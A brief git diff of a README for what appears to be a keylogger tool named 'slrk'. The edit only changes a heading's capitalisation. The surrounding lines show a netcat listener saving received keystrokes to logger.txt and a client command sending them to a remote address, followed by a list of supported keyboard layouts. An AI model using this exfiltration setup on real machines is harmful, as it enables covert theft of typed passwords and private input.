@@ -37,7 +37,7 @@ Server$ nc -6 -lvp 8888 > logger.txt
 Client#./slrk -m remote -a ::1 -p 8888
 ```
 ##NOTES:
-####Supported Keyboards:
+####Supported keyboards:
 - QWERTY: us, es, it. 
 - AZERTY: fr.
 - QWERTZ: de.
